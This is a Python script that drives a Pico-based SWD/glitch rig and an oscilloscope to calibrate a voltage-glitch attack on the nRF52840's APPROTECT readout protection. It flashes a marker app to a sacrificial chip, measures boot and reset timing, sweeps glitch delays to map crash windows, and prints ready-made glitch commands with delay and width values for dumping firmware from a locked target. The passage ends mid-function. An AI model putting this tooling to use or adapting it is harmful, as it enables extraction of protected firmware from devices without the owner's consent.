#!/usr/bin/env python3
"""
nrf_timing_marker.py  --  "build A" part 1: measure the nRF52840 boot read-timing.

⚠️ BENCH-CALIBRATION ONLY (sacrificial practice part). This ERASEALLs and flashes a
marker app, which would destroy a real target's firmware -- never run it on the chip
you want to dump. Its OUTPUT (the boot DELAY window) is what transfers: you apply the
learned delay blind on the real target. See scripts/NRF_README.md "Practice-bench vs
real target".

GOAL
----
Find the exact delay from target power-on to the moment the boot ROM finishes and
hands control to the application -- which is approximately just AFTER the boot ROM
reads APPROTECT. That delay is where the real glitch must land. Paired with the
clean-skip WIDTH the feedback harness found (~170-175 cyc / ~1.13-1.17 us), it
turns the locked-boot attack from a blind delay sweep into a targeted shot.

METHOD
------
Flash a tiny app at 0x00000000 whose reset handler's FIRST real action drives a
marker GPIO HIGH, then spins. On a normal power-on the boot ROM runs, reads
APPROTECT (which RE-LOCKS debug), and jumps to our reset vector -> the marker pin
rises. Scope CH1=VDD (trigger, t=0=power-on) vs CH2=marker pin: dt(power-on ->
marker-rise) == boot-ROM duration ~= the APPROTECT-read time. (The chip re-locks on
power-cycle, but the FLASHED app still RUNS -- we only need to see the pin edge.)

Flashing uses the nRF NVMC: set NVMC.CONFIG.WEN=1 (0x4001E504=1), AHB-write each
word to flash (the firmware's SWD WRITE to addr 0 is a plain AHB write, which the
NVMC latches to flash while WEN=1), poll NVMC.READY (0x4001E400 bit0), then WEN=0.
ERASEALL first leaves flash blank (all 0xFF) and opens the transient AHB window.

THE MARKER APP (hand-assembled Thumb; default marker = P0.06 = dongle LED LD1)
-----------------------------------------------------------------------------
  flash[0x00] = 0x20008000          ; initial SP
  flash[0x04] = 0x00000009          ; reset vector -> handler @0x08 (Thumb bit set)
  handler @0x08:
      ldr  r0,[pc,#8]   ; r0 = 0x50000500  (GPIO base+0x500: DIRSET=+0x18 OUTSET=+0x08)
      movs r1,#0x40     ; mask = 1<<6  (P0.06)
      str  r1,[r0,#0x18]; DIRSET -> P0.06 output
      str  r1,[r0,#0x08]; OUTSET -> P0.06 HIGH      <-- MARKER EDGE (first observable act)
      b    .            ; spin
      <pad>
  literal @0x14 = 0x50000500

Driving the pin HIGH gives a clean rising edge regardless of the LED's active-low
wiring (the LED just stays dark). Choose any probeable, otherwise-unused pin.

WIRING for `measure`: CH1 -> target VDD (power-on reference), CH2 -> the MARKER PIN
(P0.06 / LED LD1 pad by default). The crowbar can stay on DEC1; we do not glitch here.

RESET (nRST / warm boot) timing
-------------------------------
For the reset-glitch (nrf_reset_attack.py) the relevant delay is nRST-release ->
app-start, not power-on -> app-start. Measure it with `resetmeasure` (scope CH1=GP15
nRST trigger, CH2=marker). A STATIC marker is INVISIBLE on a warm reset -- a floating
GPIO retains its last driven level across reset -- so use a BLINKING marker (`--blink`):
the boot-ROM phase shows the static retained float and a square wave begins at app-start,
so the first CH2 edge after release == app-start. Flashing ERASEALLs UICR (opens the
part), so `flash` re-locks afterwards by default (`--no-relock` to skip; `relock` alone
to re-protect). Measured here: app-start ~8 us after release; APPROTECT read precedes it.

Examples:
  ./nrf_timing_marker.py verify                 # self-test the marker handler from RAM (no scope)
  ./nrf_timing_marker.py flash                  # erase + program marker to flash + verify + re-lock
  ./nrf_timing_marker.py measure                # POWER-ON: scope power-on -> marker delay
  ./nrf_timing_marker.py all                    # flash then measure (power-on)
  ./nrf_timing_marker.py --blink --pin 13 flash # RESET workflow: flash a BLINK marker on P0.13
  ./nrf_timing_marker.py --blink --pin 13 --tb 0.000005 resetmeasure   # nRST-release -> app-start
  ./nrf_timing_marker.py relock                 # re-protect the part (UICR.APPROTECT + power-cycle)
"""

import argparse
from colors import ColorHelpFormatter
import os
import subprocess
import sys
import time

import serial  # pyserial

SCOPE_IP_DEFAULT = "10.0.0.10"
HERE = os.path.dirname(os.path.abspath(__file__))   # this script's dir (no hardcoded path)
OUTDIR = os.path.join(HERE, "nrf52840")             # per-target output folder (screenshots)
os.makedirs(OUTDIR, exist_ok=True)

# nRF NVMC
NVMC_READY  = 0x4001E400   # bit0 = 1 -> ready
NVMC_CONFIG = 0x4001E504   # 1 = WEN (write enable), 0 = REN (read-only)

STACK_TOP  = 0x20008000
XPSR_THUMB = 0x01000000


# --------------------------------------------------------------------------- #
class Pico:
    def __init__(self, port, baud=115200):
        self.s = serial.Serial(port, baud, timeout=1.5)
        time.sleep(0.3)
        self.s.reset_input_buffer()

    def cmd(self, c, wait=0.2):
        self.s.reset_input_buffer()
        self.s.write(c.encode() + b"\r\n")
        time.sleep(wait)
        out = b""
        while self.s.in_waiting:
            out += self.s.read(self.s.in_waiting)
            time.sleep(0.01)
        return out.decode("utf-8", "replace")

    def read_word(self, addr):
        txt = self.cmd(f"SWD READ 0x{addr:08X} 1", 0.25)
        for line in txt.splitlines():
            if ":" in line and line.strip().startswith("0x"):
                toks = line.partition(":")[2].split()
                bs = [t for t in toks[:4] if len(t) == 2]
                if len(bs) == 4:
                    return int.from_bytes(bytes(int(b, 16) for b in bs), "little")
        return None

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def find_pico_port(requested):
    if requested:
        return requested
    import glob
    for p in sorted(glob.glob("/dev/ttyACM*")):
        try:
            s = serial.Serial(p, 115200, timeout=1.0); time.sleep(0.3)
            s.reset_input_buffer(); s.write(b"VERSION\r\n"); time.sleep(0.3)
            r = b""
            while s.in_waiting:
                r += s.read(s.in_waiting); time.sleep(0.02)
            s.close()
            if b"Raiden" in r:
                return p
        except serial.SerialException:
            pass
    raise SystemExit("no Raiden Pico on /dev/ttyACM* (pass --pico-port)")


# --------------------------------------------------------------------------- #
class Scope:
    def __init__(self, ip, timeout=8):
        self.ip = ip; self.timeout = timeout

    def lxi(self, scpi):
        r = subprocess.run(["lxi", "scpi", "-a", self.ip, "-t", str(self.timeout), scpi],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(f"{scpi!r}: {r.stderr.strip()}")
        return r.stdout.strip()

    def wave(self, ch):
        self.lxi(f":WAVeform:SOURce CHANnel{ch}")
        self.lxi(":WAVeform:MODE NORMal"); self.lxi(":WAVeform:FORMat ASCii")
        xinc = float(self.lxi(":WAVeform:XINCrement?"))
        xorig = float(self.lxi(":WAVeform:XORigin?"))
        raw = self.lxi(":WAVeform:DATA?")
        if raw.startswith("#"):
            raw = raw[2 + int(raw[1]):]
        v = [float(x) for x in raw.replace("\n", "").split(",") if x.strip()]
        return [xorig + i * xinc for i in range(len(v))], v

    def screenshot(self, path):
        """Grab the display and save a TRUE PNG (the scope hardcopy is BMP)."""
        try:
            from rigol_screenshot import grab_png
            return grab_png(self.ip, path)
        except Exception as e:
            print(f"screenshot failed: {e}")
            return None


# --------------------------------------------------------------------------- #
def cmd_verify(a):
    """Self-test WITHOUT scope: run the marker handler from RAM, confirm it drives
    the pin by reading GPIO OUT/DIR back. Validates the GPIO-driver logic."""
    p = Pico(a.pico_port)
    try:
        words = build_marker_image2(a.port, a.pin, a.low)
        base = 0x50000000 + a.port * 0x300
        p.cmd("TARGET NRF52840", 0.4)
        p.cmd("TARGET NRF ERASE", 1.2)
        if "OK" not in p.cmd("SWD HALT", 0.4):
            print("FAIL: halt failed"); return
        if a.low:                               # so the LOW marker has a HIGH to clear
            p.cmd(f"SWD WRITE 0x{base+0x508:08X} 0x{1<<a.pin:08X}", 0.12)  # OUTSET pin
            p.cmd(f"SWD WRITE 0x{base+0x518:08X} 0x{1<<a.pin:08X}", 0.12)  # DIRSET pin (drive high)
        for i, w in enumerate(words):           # load image at RAM 0x20000000
            p.cmd(f"SWD WRITE 0x{0x20000000 + i*4:08X} 0x{w:08X}", 0.15)
        p.cmd(f"SWD SETREG sp 0x{STACK_TOP:08X}", 0.12)
        p.cmd(f"SWD SETREG xpsr 0x{XPSR_THUMB:08X}", 0.12)
        p.cmd(f"SWD SETREG pc 0x{0x20000008:08X}", 0.12)  # handler entry
        p.cmd("SWD RESUME", 0.2)
        time.sleep(0.1)
        out = p.read_word(base + 0x504)   # GPIO OUT
        dr  = p.read_word(base + 0x514)   # GPIO DIR
        mask = 1 << a.pin
        driven = out is not None and dr is not None and (dr & mask)
        level_ok = (not (out & mask)) if a.low else bool(out & mask)
        ok = driven and level_ok
        print(f"P{a.port}.{a.pin:02d} marker handler (from RAM): "
              f"OUT=0x{(out or 0):08X} DIR=0x{(dr or 0):08X}  mask=0x{mask:X}")
        print(f"PASS: handler drives the marker pin {'LOW' if a.low else 'high'}." if ok
              else "FAIL: pin not driven correctly (check pin/port/--low).")
    finally:
        p.close()


def build_marker_image2(port, pin, low=False):
    """6 flash words for a marker app driving Pn.<pin>. Works for pin 0..31:
    the mask is built with movs r1,#1 ; lsls r1,r1,#pin (instead of movs #imm8).

      0x08  ldr  r0,[pc,#8]      4802   ; r0 = base500
      0x0A  movs r1,#1           2101
      0x0C  lsls r1,r1,#pin      (pin<<6)|0x9
      0x0E  str  r1,[r0,#0x18]   6181   ; DIRSET -> output  <-- marker EDGE
      0x10  str  r1,[r0,#0x08]   6081   ; OUTSET -> HIGH  (high marker)
            -- or --  str r1,[r0,#0x0C] 60C1 ; OUTCLR -> LOW (low marker)
      0x12  b .                  E7FE
      0x14  literal base500
    GPIO regs reached via base+0x500 so DIRSET(+0x18)/OUTSET(+0x08)/OUTCLR(+0x0C) fit STR T1 imm5.

    `low=True` drives the pin LOW (OUTCLR). Use this for a WARM (nRST) reset: an
    undriven GPIO floats HIGH on a warm reset, so a drive-HIGH marker is masked --
    drive LOW for a clean HIGH->LOW falling edge at app-start. (The edge is at DIRSET,
    since OUT defaults to 0; OUTCLR keeps it explicit.)
    """
    if not (0 <= pin <= 31):
        raise SystemExit("pin must be 0..31")
    base500 = 0x50000000 + port * 0x300 + 0x500
    lsls = (pin << 6) | (1 << 3) | 1          # lsls r1,r1,#pin
    store2 = 0x60C1 if low else 0x6081        # OUTCLR(+0x0C)=LOW  /  OUTSET(+0x08)=HIGH
    return [
        STACK_TOP,                  # 0x00 SP
        0x00000009,                 # 0x04 reset -> 0x08|thumb
        0x21014802,                 # 0x08 ldr r0,[pc,#8] ; movs r1,#1
        (0x6181 << 16) | lsls,      # 0x0C lsls r1,r1,#pin ; str r1,[r0,#0x18] DIRSET
        (0xE7FE << 16) | store2,    # 0x10 str r1,[r0,#OUT(SET|CLR)] ; b .
        base500,                    # 0x14 literal
    ]


def build_blink_image(port, pin, k=120):
    """10 flash words: a marker that BLINKS Pn.<pin> (continuous square wave) from
    app-start. A static marker is invisible across a warm (nRST) reset -- a floating
    GPIO RETAINS its last driven level, so neither a held-high nor a held-low marker
    transitions at app-start. A blink does: the boot-ROM phase shows the static
    retained float, then a square wave begins at app-start -> the FIRST CH2 edge after
    nRST release == app-start (within one half-period). `k` sets the half-period
    (~k*3 core cycles @64MHz; k=120 ~= 5.6 us half / ~90 kHz).

      0x08 ldr r0,[pc,#24]  4806    ; r0 = base500
      0x0A movs r1,#1       2101
      0x0C lsls r1,r1,#pin  (pin<<6)|9
      0x0E str r1,[r0,#0x18]6181    ; DIRSET -> output
      0x10 str r1,[r0,#0x08]6081    ; OUTSET -> HIGH    <- loop top
      0x12 movs r2,#k       2200|k
      0x14 subs r2,#1       3A01     <- delay1
      0x16 bne .-2          D1FD
      0x18 str r1,[r0,#0x0C]60C1    ; OUTCLR -> LOW
      0x1A movs r2,#k       2200|k
      0x1C subs r2,#1       3A01     <- delay2
      0x1E bne .-2          D1FD
      0x20 b 0x10           E7F6
      0x22 (pad)            0000
      0x24 literal base500
    """
    if not (0 <= pin <= 31):
        raise SystemExit("pin must be 0..31")
    if not (1 <= k <= 255):
        raise SystemExit("k must be 1..255")
    base500 = 0x50000000 + port * 0x300 + 0x500
    lsls = (pin << 6) | (1 << 3) | 1
    movsk = 0x2200 | k
    return [
        STACK_TOP,                       # 0x00 SP
        0x00000009,                      # 0x04 reset -> 0x08|thumb
        (0x2101 << 16) | 0x4806,         # 0x08 ldr r0,[pc,#24] ; movs r1,#1
        (0x6181 << 16) | lsls,           # 0x0C lsls r1,r1,#pin ; str DIRSET
        (movsk << 16) | 0x6081,          # 0x10 str OUTSET(high) ; movs r2,#k
        (0xD1FD << 16) | 0x3A01,         # 0x14 subs r2,#1 ; bne .-2
        (movsk << 16) | 0x60C1,          # 0x18 str OUTCLR(low) ; movs r2,#k
        (0xD1FD << 16) | 0x3A01,         # 0x1C subs r2,#1 ; bne .-2
        (0x0000 << 16) | 0xE7F6,         # 0x20 b 0x10 ; pad
        base500,                         # 0x24 literal
    ]


def program_marker(p, words):
    """Program the marker image to flash@0 via NVMC (assumes the part is ERASEALL'd/open).
    No verify here -- callers that care should verify. Used to re-flash the marker between
    fault-map delays (a strong glitch can corrupt flash@0, and that corruption persists)."""
    p.cmd("TARGET NRF ERASE", 1.2)                 # blank flash + transient unlock
    p.cmd("SWD HALT", 0.3)
    p.cmd(f"SWD WRITE 0x{NVMC_CONFIG:08X} 0x1", 0.2)   # NVMC WEN=1
    for i, w in enumerate(words):
        p.cmd(f"SWD WRITE 0x{i*4:08X} 0x{w:08X}", 0.2)
        for _ in range(20):
            r = p.read_word(NVMC_READY)
            if r is not None and (r & 1):
                break
            time.sleep(0.005)
    p.cmd(f"SWD WRITE 0x{NVMC_CONFIG:08X} 0x0", 0.2)   # back to read-only


def relock(p):
    """Re-protect the part: NVMC WEN + write UICR.APPROTECT=0xFFFFFF00 + power-cycle.
    On this rev-2 nRF52840, UICR.APPROTECT 0xFFFFFFFF=unprotected, 0xFFFFFF00=protected."""
    p.cmd("SWD WRITE 0x4001E504 0x1", 0.2)        # NVMC WEN=1
    p.cmd("SWD WRITE 0x10001208 0xFFFFFF00", 0.3) # UICR.APPROTECT low byte 0x00 = enabled
    p.cmd("SWD WRITE 0x4001E504 0x0", 0.2)        # NVMC WEN=0
    p.cmd("TARGET POWER OFF", 0.5); time.sleep(0.5)
    p.cmd("TARGET POWER ON", 0.5);  time.sleep(0.5)
    return "APPROTECT=PROTECTED" in p.cmd("TARGET NRF STATUS", 0.8)


def cmd_flash(a):
    """Erase, program the marker app to flash 0x00, verify readback."""
    p = Pico(a.pico_port)
    try:
        words = (build_blink_image(a.port, a.pin, a.k) if a.blink
                 else build_marker_image2(a.port, a.pin, a.low))
        kind = "BLINK" if a.blink else ("LOW" if a.low else "HIGH")
        p.cmd("TARGET NRF52840", 0.4)
        p.cmd("TARGET NRF ERASE", 1.2)                 # blank flash + transient unlock
        p.cmd("SWD HALT", 0.3)
        p.cmd(f"SWD WRITE 0x{NVMC_CONFIG:08X} 0x1", 0.2)   # NVMC WEN=1
        for i, w in enumerate(words):
            addr = i * 4
            p.cmd(f"SWD WRITE 0x{addr:08X} 0x{w:08X}", 0.2)
            # NVMC.READY poll (each word ~40 us; SWD round-trip already exceeds it)
            for _ in range(20):
                r = p.read_word(NVMC_READY)
                if r is not None and (r & 1):
                    break
                time.sleep(0.005)
        p.cmd(f"SWD WRITE 0x{NVMC_CONFIG:08X} 0x0", 0.2)   # back to read-only
        # verify
        ok = True
        for i, w in enumerate(words):
            got = p.read_word(i * 4)
            mark = "ok" if got == w else "MISMATCH"
            if got != w:
                ok = False
            print(f"  flash[0x{i*4:02X}] = 0x{(got or 0):08X}  (want 0x{w:08X}) {mark}")
        print(f"PASS: {kind}-marker app programmed (P{a.port}.{a.pin})." if ok
              else "FAIL: flash verify mismatch (re-run; check NVMC/erase).")
        # Flashing ERASEALL'd UICR -> part is now OPEN. Re-lock it for the reset attack.
        if ok and a.relock:
            print("re-locking the part (write UICR.APPROTECT + power-cycle)...")
            print("  re-locked: PROTECTED." if relock(p) else
                  "  WARN: re-lock did NOT report PROTECTED -- check manually.")
    finally:
        p.close()


def cmd_relock(a):
    """Re-protect the part (write UICR.APPROTECT=0xFFFFFF00 + power-cycle)."""
    p = Pico(a.pico_port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        print("re-locked: PROTECTED." if relock(p) else
              "WARN: re-lock did NOT report PROTECTED -- check manually.")
    finally:
        p.close()


def cmd_resetmeasure(a):
    """RESET-boot timing: trigger on the nRST RELEASE edge (CH1=GP15) and find the
    drive-LOW marker's FALLING edge (CH2=marker pin). dt = release -> app-start is the
    delay the reset-glitch must aim at (warm boot, DEC1 already up -> tens of us, no
    rail ramp). A harmless late-glitch APPROTECTRST burst just generates repeatable nRST
    cycles; the part must be LOCKED (the firmware pre-flight aborts otherwise)."""
    sc = Scope(a.scope_ip)
    p = Pico(a.pico_port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        if "APPROTECT=PROTECTED" not in p.cmd("TARGET NRF STATUS", 0.7):
            print("part not locked -> re-locking first (the glitch pre-flight needs a locked part)...")
            if not relock(p):
                print("WARN: re-lock failed; resetmeasure may abort.");
        # CH1 = GP15 (nRST) trigger on rising = release; CH2 = drive-LOW marker pin
        sc.lxi(":CHANnel1:DISPlay ON"); sc.lxi(":CHANnel1:COUPling DC")
        sc.lxi(":CHANnel1:SCALe 1.0"); sc.lxi(":CHANnel1:OFFSet -2.0")
        sc.lxi(":CHANnel2:DISPlay ON"); sc.lxi(":CHANnel2:COUPling DC")
        sc.lxi(":CHANnel2:SCALe 1.0"); sc.lxi(":CHANnel2:OFFSet -2.0")
        sc.lxi(f":TIMebase:MAIN:SCALe {a.tb}")
        sc.lxi(":TIMebase:MAIN:OFFSet " + str(float(a.tb) * 4))   # release near left edge
        sc.lxi(":TRIGger:MODE EDGE"); sc.lxi(":TRIGger:EDGE:SOURce CHANnel1")
        sc.lxi(":TRIGger:EDGE:SLOPe POSitive"); sc.lxi(":TRIGger:EDGE:LEVel 1.5")
        sc.lxi(":TRIGger:SWEep NORMal")
        sc.lxi(":SINGle"); time.sleep(0.3)
        # fire a burst of nRST resets with a HARMLESS late (50 ms) glitch so the boot is undisturbed
        p.s.reset_input_buffer()
        p.s.write(b"TARGET GLITCH APPROTECTRST 50000 50000 1 10 10 1 200 6 40\r\n")
        end = time.time() + 10; st = ""
        while time.time() < end:
            st = sc.lxi(":TRIGger:STATus?")
            if st.startswith("STOP") or st.startswith("TD"):
                break
            time.sleep(0.05)
        if not (st.startswith("STOP") or st.startswith("TD")):
            print(f"no nRST-release trigger on CH1=GP15 (status={st}). "
                  f"Confirm CH1 on GP15 and trigger level 1.5 V.")
            return
        time.sleep(0.25)                       # let the acquisition memory settle after STOP
        t1, v1 = sc.wave(1); t2, v2 = sc.wave(2)
        us = lambda x: x * 1e6
        thr = a.threshold
        # release edge = CH1 GP15 RISING through thr (skip the initial idle-high; the
        # release is the rising edge that follows the reset-hold LOW gap).
        t_rel = None; prev = None
        for t, v in zip(t1, v1):
            if prev is not None and prev <= thr and v > thr:
                t_rel = t; break
            prev = v
        if t_rel is None:   # fallback: pin already high at window start
            t_rel = next((t for t, v in zip(t1, v1) if v > thr), None)
        # app-start = the FIRST CH2 marker edge (EITHER direction) after release. With
        # the blink marker the boot-ROM phase is a static retained float and the app
        # phase is a square wave, so the first threshold crossing == app-start.
        t_mark = None; prev = None
        for t, v in zip(t2, v2):
            if t_rel is not None and t <= t_rel:
                prev = v; continue
            if prev is not None and ((prev <= thr) != (v <= thr)):   # any crossing
                t_mark = t; break
            prev = v
        if t_rel is None or t_mark is None:
            print(f"could not locate edges (release={t_rel}, marker-edge={t_mark}). "
                  f"Confirm CH1=GP15, CH2=P{a.port}.{a.pin} flashed with the BLINK marker, tb={a.tb}.")
        else:
            d = us(t_mark - t_rel)
            print(f"nRST release (CH1 GP15 rising)   at t = {us(t_rel):+.1f} us   [t=0 ref]")
            print(f"app-start    (CH2 marker falling) at t = +{d:.1f} us")
            print(f"\n>>> RESET boot-timing: nRST-release -> app-start = {d:.1f} us")
            lo = max(0, int(d * 0.5)); hi = int(d * 1.1) + 1
            print(f">>> The APPROTECT read precedes app-start; sweep the reset-glitch DELAY "
                  f"~{lo}..{hi} us, width 170-175 cyc:")
            print(f">>>   TARGET GLITCH APPROTECTRST {lo} {hi} 1 170 175 2 200 6 <tries>")
        sc.screenshot(f"{OUTDIR}/reset_timing.png")
        try:
            from PIL import Image
            Image.open(f"{OUTDIR}/reset_timing.png").save(f"{OUTDIR}/scope_live.png")
        except Exception:
            pass
        print(f"screenshot -> {OUTDIR}/reset_timing.png")
    finally:
        p.close()


def cmd_measure(a):
    """Power-cycle and scope the power-on -> marker-rise delay."""
    sc = Scope(a.scope_ip)
    p = Pico(a.pico_port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        # scope: CH1=VDD trigger (t=0 power-on), CH2=marker pin
        sc.lxi(":CHANnel1:DISPlay ON"); sc.lxi(":CHANnel1:COUPling DC")
        sc.lxi(":CHANnel1:SCALe 1.0"); sc.lxi(":CHANnel1:OFFSet -2.0")
        sc.lxi(":CHANnel2:DISPlay ON"); sc.lxi(":CHANnel2:COUPling DC")
        sc.lxi(":CHANnel2:SCALe 1.0"); sc.lxi(":CHANnel2:OFFSet -2.0")
        sc.lxi(f":TIMebase:MAIN:SCALe {a.tb}")
        sc.lxi(":TIMebase:MAIN:OFFSet " + str(float(a.tb) * 5))   # power-on near left
        sc.lxi(":TRIGger:MODE EDGE"); sc.lxi(":TRIGger:EDGE:SOURce CHANnel1")
        sc.lxi(":TRIGger:EDGE:SLOPe POSitive"); sc.lxi(f":TRIGger:EDGE:LEVel {a.trig_level}")
        sc.lxi(":TRIGger:SWEep NORMal")
        p.cmd("TARGET POWER OFF", 0.5); time.sleep(0.3)
        sc.lxi(":SINGle"); time.sleep(0.3)
        p.cmd("TARGET POWER ON", 0.4)
        end = time.time() + 5; st = ""
        while time.time() < end:
            st = sc.lxi(":TRIGger:STATus?")
            if st.startswith("STOP") or st.startswith("TD"):
                break
            time.sleep(0.05)
        if not (st.startswith("STOP") or st.startswith("TD")):
            print(f"no power-on trigger on CH1 (status={st}). Check CH1 on VDD / trigger level.")
            return
        t1, v1 = sc.wave(1); t2, v2 = sc.wave(2)
        us = lambda x: x * 1e6
        # power-on = first CH1 (VDD) crosses the low trig level (~ramp start ~= GP10-high,
        # the same reference the attack delay uses). t=0.
        t_pon = next((t for t, v in zip(t1, v1) if v > a.trig_level), None)
        # BOR/POR release ~= CPU & boot-ROM start = first CH1 crosses ~1.7 V.
        t_bor = next((t for t, v in zip(t1, v1)
                      if v > a.bor_level and (t_pon is None or t >= t_pon)), None)
        # app-start = first CH2 (marker P0.13) crosses its threshold AFTER power-on.
        t_mark = next((t for t, v in zip(t2, v2)
                       if v > a.threshold and (t_pon is None or t > t_pon)), None)
        if t_pon is None or t_mark is None:
            print(f"could not locate edges (CH1 power-on={t_pon}, CH2 marker={t_mark}). "
                  f"Confirm CH1=VDD, CH2=P{a.port}.{a.pin}, trig level {a.trig_level} V.")
        else:
            d_app = us(t_mark - t_pon)
            print(f"power-on  (CH1 VDD > {a.trig_level} V) at t = {us(t_pon):+.1f} us   [t=0 ref]")
            if t_bor is not None:
                print(f"BOR/CPU   (CH1 VDD > {a.bor_level} V) at t = +{us(t_bor - t_pon):.1f} us"
                      f"   (boot-ROM execution starts ~here)")
            print(f"app-start (CH2 marker)                 at t = +{d_app:.1f} us")
            print(f"\n>>> BOOT read-timing: power-on -> app-start = {d_app:.1f} us")
            if t_bor is not None:
                w0 = us(t_bor - t_pon)
                print(f">>> APPROTECT read lives in the window ~{w0:.0f}..{d_app:.0f} us after "
                      f"power-on (BOR -> app-start). Sweep the attack DELAY across THAT, "
                      f"width 170-175 cyc.")
            else:
                print(f"    (BOR crossing not found at {a.bor_level} V; sweep delay just below "
                      f"{d_app:.0f} us, width 170-175 cyc.)")
        sc.screenshot(f"{OUTDIR}/timing_marker.png")
        try:
            from PIL import Image
            Image.open(f"{OUTDIR}/timing_marker.png").save(f"{OUTDIR}/scope_live.png")
        except Exception:
            pass
        print(f"screenshot -> {OUTDIR}/timing_marker.png")
    finally:
        p.close()


def cmd_crashmap(a):
    """Localize the sensitive boot window using ONLY VDD (trigger) + P0.13 marker
    (survival) -- no DEC1/core probe needed.

    Sweeps the glitch DELAY across the boot at a strong (crash-prone) width; at each
    delay, fires SHOT (power-cycle + glitch) and checks whether the boot SURVIVED
    (marker P0.13 rose, CH2 VMAX high) or CRASHED (no marker). The delay band where
    survival drops = the glitch is hitting LIVE boot-ROM code = brackets
    [core-up .. app-start], where the APPROTECT read lives. The first delay that can
    crash the boot ~= core-up (CPU start). Concentrate the real attack there.
    """
    sc = Scope(a.scope_ip)
    p = Pico(a.pico_port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        sc.lxi(":CHANnel1:DISPlay ON"); sc.lxi(":CHANnel1:COUPling DC")
        sc.lxi(":CHANnel1:SCALe 1.0"); sc.lxi(":CHANnel1:OFFSet -2.0")   # VDD (trigger)
        sc.lxi(":CHANnel2:DISPlay ON"); sc.lxi(":CHANnel2:COUPling DC")
        sc.lxi(":CHANnel2:SCALe 1.0"); sc.lxi(":CHANnel2:OFFSet -2.0")   # P0.13 marker
        sc.lxi(f":TIMebase:MAIN:SCALe {a.tb}")
        sc.lxi(":TIMebase:MAIN:OFFSet " + str(float(a.tb) * 5))
        sc.lxi(":TRIGger:MODE EDGE"); sc.lxi(":TRIGger:EDGE:SOURce CHANnel1")
        sc.lxi(":TRIGger:EDGE:SLOPe POSitive"); sc.lxi(f":TRIGger:EDGE:LEVel {a.trig_level}")
        sc.lxi(":TRIGger:SWEep NORMal")
        print(f"# crash-map: delay {a.d0}..{a.d1} step {a.dstep} us, width {a.width} cyc, "
              f"reps {a.reps}. survival% = boot reached app-start (marker).")
        print("delay_us,survival_pct")
        rows = []
        D = a.d0
        while D <= a.d1:
            surv = 0
            for _ in range(a.reps):
                sc.lxi(":SINGle"); time.sleep(0.15)
                p.cmd(f"TARGET NRF SHOT {D} {a.width}", 0.4)
                # wait for the power-on trigger
                end = time.time() + D / 1e6 + 3; ok = False
                while time.time() < end:
                    stt = sc.lxi(":TRIGger:STATus?")
                    if stt.startswith("STOP") or stt.startswith("TD"):
                        ok = True; break
                    time.sleep(0.03)
                if ok:
                    try:
                        vmax2 = float(sc.lxi(":MEASure:VMAX? CHANnel2"))
                    except Exception:
                        vmax2 = 0.0
                    if vmax2 > a.threshold:
                        surv += 1
            pct = 100.0 * surv / a.reps
            line = f"{D},{pct:.0f}"
            print(line); rows.append((D, pct))
            D += a.dstep
        # summarize: crash band(s) = survival < 100
        crashy = [r for r in rows if r[1] < 100]
        if crashy:
            d_first = crashy[0][0]
            d_min = min(crashy, key=lambda r: r[1])
            print(f"\nfirst delay that ever crashes the boot = {d_first} us (~= core-up / "
                  f"glitch starts hitting live code)")
            print(f"deepest crash at delay = {d_min[0]} us (survival {d_min[1]:.0f}%) "
                  f"<- most sensitive; concentrate the attack delay around here, width 170-175 cyc")
        else:
            print("\nno crashes anywhere -- width too weak or glitch not coupling; "
                  "raise --width or check the crowbar.")
    finally:
        p.close()


def cmd_marktime(a):
    """Boot timing when CH1 is on GP2 (the glitch line), not VDD.

    There is no power-on edge on GP2, so use the glitch pulse as a fiducial: fire
    SHOT at a known `delay` after power-on (GP2 rises -> scope trigger at t=0); the
    marker rose earlier at scope-time t_mark = T_marker - delay (negative). Hence
    T_marker = delay + t_mark. Also reports how far the glitch landed AFTER the
    marker (= delay - T_marker), so you can see glitch-vs-APPROTECT-read directly.
    Pick `delay` > expected T_marker (~0.7-1 ms) so the marker is captured pre-trigger.
    """
    sc = Scope(a.scope_ip)
    p = Pico(a.pico_port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        sc.lxi(":CHANnel1:DISPlay ON"); sc.lxi(":CHANnel1:COUPling DC")
        sc.lxi(":CHANnel1:SCALe 1.0"); sc.lxi(":CHANnel1:OFFSet -2.0")   # GP2 gate pulse
        sc.lxi(":CHANnel2:DISPlay ON"); sc.lxi(":CHANnel2:COUPling DC")
        sc.lxi(":CHANnel2:SCALe 1.0"); sc.lxi(":CHANnel2:OFFSet -2.0")   # P0.13 marker
        sc.lxi(f":TIMebase:MAIN:SCALe {a.tb}")
        sc.lxi(":TIMebase:MAIN:OFFSet 0")          # GP2 trigger centred; marker sits to its left
        sc.lxi(":TRIGger:MODE EDGE"); sc.lxi(":TRIGger:EDGE:SOURce CHANnel1")
        sc.lxi(":TRIGger:EDGE:SLOPe POSitive"); sc.lxi(":TRIGger:EDGE:LEVel 1.5")
        sc.lxi(":TRIGger:SWEep NORMal")
        sc.lxi(":SINGle"); time.sleep(0.3)
        print(p.cmd(f"TARGET NRF SHOT {a.shot_delay} {a.shot_width}", 0.7).strip().splitlines()[-1]
              if p else "")
        end = time.time() + a.shot_delay / 1e6 + 4; st = ""
        while time.time() < end:
            st = sc.lxi(":TRIGger:STATus?")
            if st.startswith("STOP") or st.startswith("TD"):
                break
            time.sleep(0.05)
        if not (st.startswith("STOP") or st.startswith("TD")):
            print(f"no GP2 trigger (status={st}). Check CH1 on GP2 / trigger level / SHOT fired.")
            return
        t1, v1 = sc.wave(1); t2, v2 = sc.wave(2)
        us = lambda x: x * 1e6
        thr = a.threshold
        t_gp2 = next((t for t, v in zip(t1, v1) if v > thr), None)   # ~0 (the trigger)
        t_mark = next((t for t, v in zip(t2, v2) if v > thr), None)  # negative (pre-trigger)
        wmin, wmax = us(t2[0]), us(t2[-1])
        if t_mark is None:
            print(f"marker edge not in the {wmin:.0f}..{wmax:.0f} us window. "
                  f"Raise --shot-delay (so the marker falls inside pre-trigger) or --tb. "
                  f"Is CH2 on P{a.port}.{a.pin}?")
            return
        T_marker = a.shot_delay + us(t_mark)        # us
        glitch_after = a.shot_delay - T_marker      # = -us(t_mark); how late the glitch was
        print(f"GP2 fiducial edge (CH1) at t={us(t_gp2 or 0):+.1f} us (trigger ref)")
        print(f"marker edge (CH2) at t={us(t_mark):+.1f} us")
